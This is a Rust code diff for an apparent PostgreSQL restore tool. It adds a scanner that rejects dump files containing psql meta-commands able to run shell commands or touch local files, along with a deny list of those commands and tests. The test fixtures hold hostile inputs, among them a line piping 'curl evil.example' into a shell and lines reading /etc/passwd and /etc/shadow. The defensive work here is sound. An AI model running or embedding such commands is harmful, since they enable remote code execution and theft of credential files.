@@ -46,6 +46,10 @@ pub struct RestoreRequest {
     pub single_transaction: bool,
     #[serde(default)]
     pub binary_directory: Option<String>,
+    /// Restore a file that contains psql meta-commands anyway. Off by default:
+    /// see [`scan_for_meta_commands`].
+    #[serde(default)]
+    pub allow_meta_commands: bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -222,6 +226,20 @@ pub async fn restore(
     let binary = resolve_binary(request.binary_directory.as_deref(), "psql");
 
     let total = tokio::fs::metadata(&request.path).await?.len();
+
+    if !request.allow_meta_commands {
+        if let Some(found) = scan_for_meta_commands(&request.path).await? {
+            return Err(CoreError::Invalid(format!(
+                "`{}` contains the psql meta-command `{}`, which would run outside the \
+                 database — `\\!` executes a shell command and `\\i` reads another file. \
+                 A dump written by pg_dump never contains these. Only restore this file if \
+                 you trust where it came from; you can then re-run with the override in the \
+                 restore dialog.",
+                request.path, found
+            )));
+        }
+    }
+
     let mut file = tokio::fs::File::open(&request.path).await?;
 
     let mut command = Command::new(&binary);
@@ -348,6 +366,60 @@ pub async fn restore(
     })
 }
 
+/// psql meta-commands that reach outside the database, and so turn "restore
+/// this file" into "run this on my machine".
+///
+/// `\!` runs a shell command, `\i` and `\ir` read another file, `\o` and
+/// `\copy` write and read the local filesystem, and `\g`/`\gx` can be given a
+/// file or a pipe. `pg_dump` emits none of them: the only backslash sequences
+/// in its plain output are `\.` to end COPY data and `\connect`.
+const DANGEROUS_META_COMMANDS: [&str; 8] = [
+    "\\!",
+    "\\i ",
+    "\\ir ",
+    "\\include",
+    "\\o ",
+    "\\copy",
+    "\\g ",
+    "\\gx",
+];
+
+/// Look for a meta-command that would execute outside the database.
+///
+/// Only the start of a line counts, because that is the only place psql treats
+/// a backslash as a command — inside a string or COPY block it is data. The
+/// first match is returned so the caller can name it.
+async fn scan_for_meta_commands(path: &str) -> CoreResult<Option<String>> {
+    let file = tokio::fs::File::open(path).await?;
+    let mut lines = BufReader::new(file).lines();
+    let mut in_copy_block = false;
+
+    while let Ok(Some(line)) = lines.next_line().await {
+        let trimmed = line.trim_start();
+
+        // Inside a COPY block every line is data until the terminating `\.`.
+        if in_copy_block {
+            if trimmed == "\\." {
+                in_copy_block = false;
+            }
+            continue;
+        }
+        if trimmed.starts_with("COPY ") && trimmed.ends_with("FROM stdin;") {
+            in_copy_block = true;
+            continue;
+        }
+
+        if let Some(found) = DANGEROUS_META_COMMANDS
+            .iter()
+            .find(|command| trimmed.starts_with(*command))
+        {
+            return Ok(Some(found.trim_end().to_string()));
+        }
+    }
+
+    Ok(None)
+}
+
 /// Report whether the external tools are available and which version they are.
 pub async fn tool_version(directory: Option<&str>, name: &str) -> Option<String> {
     let binary = resolve_binary(directory, name);
@@ -419,6 +491,49 @@ mod tests {
     fn detects_problem_lines() {
         assert!(is_problem("pg_dump: error: connection failed"));
         assert!(!is_problem("pg_dump: dumping contents of table users"));
+    }
+
+    async fn scan(body: &str) -> Option<String> {
+        let path = std::env::temp_dir().join(format!("pgl-dump-{}.sql", uuid_like()));
+        std::fs::write(&path, body).unwrap();
+        let found = scan_for_meta_commands(path.to_str().unwrap())
+            .await
+            .unwrap();
+        std::fs::remove_file(&path).ok();
+        found
+    }
+
+    fn uuid_like() -> u128 {
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos()
+    }
+
+    #[tokio::test]
+    async fn accepts_an_ordinary_dump() {
+        let dump = "--\n-- PostgreSQL database dump\n--\n\
+                    SET statement_timeout = 0;\n\
+                    CREATE TABLE public.users (id integer, note text);\n\
+                    COPY public.users (id, note) FROM stdin;\n\
+                    1\tnot a \\! command, just data\n\
+                    \\.\n\
+                    \\connect other_db\n\
+                    ALTER TABLE public.users OWNER TO postgres;\n";
+        assert_eq!(scan(dump).await, None);
+    }
+
+    #[tokio::test]
+    async fn rejects_a_dump_that_runs_a_shell_command() {
+        assert_eq!(
+            scan("CREATE TABLE t (id int);\n\\! curl evil.example | sh\n").await,
+            Some("\\!".to_string())
+        );
+        assert_eq!(scan("\\i /etc/passwd\n").await, Some("\\i".to_string()));
+        assert_eq!(
+            scan("  \\copy t FROM '/etc/shadow'\n").await,
+            Some("\\copy".to_string())
+        );
     }
 
     #[test]
